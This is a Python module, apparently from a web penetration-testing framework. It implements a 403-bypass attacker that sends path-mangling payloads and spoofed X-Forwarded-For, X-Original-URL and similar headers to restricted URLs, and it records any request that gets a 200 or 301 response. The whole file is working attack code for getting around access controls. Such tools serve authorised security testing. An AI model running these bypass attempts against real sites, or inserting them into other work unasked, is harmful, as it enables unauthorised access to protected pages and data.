from flask import Config
from utils.utilities import *
from thirdparty.sqlmap.DynamicContentParser import DynamicContentParser
from core.AttackerBase import *

class Bypass403(AttackerBase):
    def __init__(self,reporter):
        super().__init__()       
        self.reporter=reporter
        self.bypass_headers_localhost=["X-Custom-IP-Authorization", "X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "X-Host", "X-Forwarded-Host"]
        self.bypass_headers_directory=["X-Rewrite-URL","X-Original-URL"]
    
    @LOGGER("Bypass403")
    def start(self,urls):
        results={"payload":[],"url":[]}
        perm_headers=self.requester.HEADERS.copy()
        self.reporter.createBlock("#### 403Bypass #### BYPASSED URLS")
        for url in urls:
            last_dir=""
            tmp_url=url
            domain="/".join(url.split("/")[:3])
            dirs="/"
            if(len(url.split("/"))>3):    
                last_dir=url.split("/")[-1]
                tmp_url="/".join(url.split("/")[:-1])
                domain="/".join(url.split("/")[:3])
                dirs=url.replace(domain,"")[1:]
            resp1=self.requester.send_get(domain)
            resp2=self.requester.send_get(domain)
            parser=DynamicContentParser(resp1.text,resp2.text)
            url_payload=[last_dir+"%09",last_dir+"#",last_dir+".html",last_dir+"?","%20" + last_dir + "%20/", "%2e/" + last_dir, "./" + last_dir + "/./", "/" + last_dir + "//", last_dir + "..;/", last_dir + "./", last_dir + "/", last_dir + "/*", last_dir + "/.", last_dir + "//", last_dir + "?", last_dir + "???", last_dir + "%20/", last_dir + "/%25", last_dir + "/.randomstring"]
            for payload in url_payload:
                with_payload=tmp_url+"/"+payload
                resp=self.requester.sendGET(with_payload)
                if(not resp is None and (resp.status_code==200 or resp.status_code==301)):
                    results["payload"].append(payload)
                    results["url"].append(with_payload)
            for header in self.bypass_headers_localhost:
                tmp_headers=perm_headers.copy()
                tmp_headers[header]="127.0.0.1"
                self.requester.HEADERS=tmp_headers
                resp=self.requester.sendGET(url)
                if(not resp is None and (resp.status_code==200 or resp.status_code==301)):
                    results["payload"].append(header+" : 127.0.0.1")
                    results["url"].append(url)
            for header in self.bypass_headers_directory:
                tmp_headers=perm_headers.copy()
                tmp_headers[header]=dirs
                self.requester.HEADERS=tmp_headers
                resp=self.requester.sendGET(domain)
                if(not resp is None and parser.compareTo(resp.text)<0.90 and (resp.status_code==200 or resp.status_code==301)):
                    results["payload"].append(header+" : "+dirs)
                    results["url"].append(url)                
        for x,y in zip(results["payload"],results["url"]):
            self.reporter.addRow(y,x)